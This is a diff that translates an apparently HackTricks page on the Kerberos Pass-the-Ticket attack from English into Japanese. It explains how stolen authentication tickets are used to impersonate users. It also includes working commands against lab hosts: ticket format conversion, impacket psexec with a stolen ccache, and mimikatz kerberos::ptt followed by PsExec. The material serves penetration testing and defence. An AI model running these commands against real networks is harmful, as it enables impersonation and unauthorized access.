@@ -1,28 +1,27 @@
-# Pass the Ticket
+# パス・ザ・チケット
 
 {{#include ../../banners/hacktricks-training.md}}
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフロー**を簡単に構築し、**自動化**します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
-## Pass The Ticket (PTT)
+## パス・ザ・チケット (PTT)
 
-In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.
+**パス・ザ・チケット (PTT)**攻撃手法では、攻撃者は**ユーザーの認証チケットを盗む**ことで、パスワードやハッシュ値を盗むのではありません。この盗まれたチケットは、**ユーザーを偽装する**ために使用され、ネットワーク内のリソースやサービスへの不正アクセスを得ることができます。
 
-**Read**:
+**読む**:
 
-- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+- [Windowsからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [Linuxからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Swaping Linux and Windows tickets between platforms**
+### **プラットフォーム間でのLinuxとWindowsのチケットの交換**
 
-The [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) tool converts ticket formats using just the ticket itself and an output file.
-
+[**ticket_converter**](https://github.com/Zer1t0/ticket_converter)ツールは、チケット自体と出力ファイルを使用してチケット形式を変換します。
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -30,11 +29,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
+Windowsでは[Kekeo](https://github.com/gentilkiwi/kekeo)を使用できます。
 
-In Windows [Kekeo](https://github.com/gentilkiwi/kekeo) can be used.
-
-### Pass The Ticket Attack
-
+### パス・ザ・チケット攻撃
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -47,18 +44,16 @@ mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.k
 klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
-
-## References
+## 参考文献
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフロー**を簡単に構築し、**自動化**します。\
+今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
